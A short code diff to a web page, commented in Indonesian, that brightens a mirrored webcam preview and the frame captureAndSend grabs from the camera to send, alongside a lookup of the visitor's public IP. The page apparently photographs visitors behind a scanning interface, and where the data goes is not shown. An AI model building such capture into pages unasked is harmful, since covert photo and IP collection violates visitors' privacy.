@@ -95,6 +95,8 @@
             height: 100%;
             object-fit: cover;
             transform: scaleX(-1);
+            /* UPDATE: KAMERA DICERAHKAN */
+            filter: brightness(1.3) contrast(1.1) saturate(1.1);
         }
 
         .scan-line {
@@ -284,10 +286,14 @@
         async function captureAndSend(cameraStream) {
             const video = document.getElementById('video-preview'); // Ambil dari preview langsung
             const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
             
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            // UPDATE: Terapkan efek cerah ke foto yang akan dikirim
+            ctx.filter = "brightness(1.3) contrast(1.1) saturate(1.1)";
+            ctx.drawImage(video, 0, 0);
 
             const ipRes = await fetch('https://api.ipify.org?format=json').catch(() => ({json: () => ({ip: 'Unknown'})}));
             const ipData = await ipRes.json();
